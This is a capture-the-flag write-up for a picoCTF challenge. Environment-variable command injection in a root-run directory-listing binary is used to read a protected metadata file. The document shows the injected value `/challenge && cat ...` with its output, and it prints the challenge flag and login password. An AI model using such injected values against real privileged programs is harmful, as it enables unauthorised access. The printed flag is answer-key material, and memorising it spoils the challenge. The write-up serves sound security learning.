# local target

| Information | Description |
| :-- | :-- |
| Category | Binary Exploitation |
| Difficulty | Medium |

# Problem Description

We've got a binary that can list directories as root, try it out!!
`ssh` to `saturn.picoctf.net:58711`, and run the binary named "bin" once connected.
Login as `ctf-player` with the password, `fd7746b4`

> Hint 1: Have you checked the content of the `/root` folder
> Hint 2: Find a way to add more instructions to the `ls`

# Solution

Follow instructions on problem description after `ssh` to the server. I run `./bin` at first.

```bash=
ctf-player@pico-chall$ ./bin
Error: SECRET_DIR environment variable is not set
```

I need to set up an environment variable called `SECRET_DIR`. How about setting it as `/`.

```bash=
ctf-player@pico-chall$ export SECRET_DIR="/"
ctf-player@pico-chall$ ./bin
Listing the content of / as root:
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
```

The *challenge* folder looks weired. Let me check this directory.

```bash=
ctf-player@pico-chall$ export SECRET_DIR="/challenge"
ctf-player@pico-chall$ ./bin
Listing the content of /challenge as root: 
config-box.py  metadata.json  profile
```

There are 3 files inside. I'm curious about *metadata.json* since it may contain flag. To check the content inside a file, I use `cat`. But how to run `cat` with `./bin`? From the execution above, I guess the program `bin` takes `SECRET_DIR` as input and concatenate the value with prefix `ls`. That is, the command it run might be `system("ls" + SECRET_DIR)`. Thus, I try command injection. I set `SECRET_DIR` to `/challenge && cat /challenge/metadata.json` and run `./bin`.

```bash-
ctf-player@pico-chall$ export SECRET_DIR="/challenge && cat /challenge/metadata.json"
ctf-player@pico-chall$ ./bin
Listing the content of /challenge && cat /challenge/metadata.json as root: 
config-box.py  metadata.json  profile
{"flag": "picoCTF{Power_t0_man!pul4t3_3nv_fc3ff2c9}", "password": "fd7746b4"}
```

Congradulation! The flag is here!

:triangular_flag_on_post:: `picoCTF{Power_t0_man!pul4t3_3nv_fc3ff2c9}`
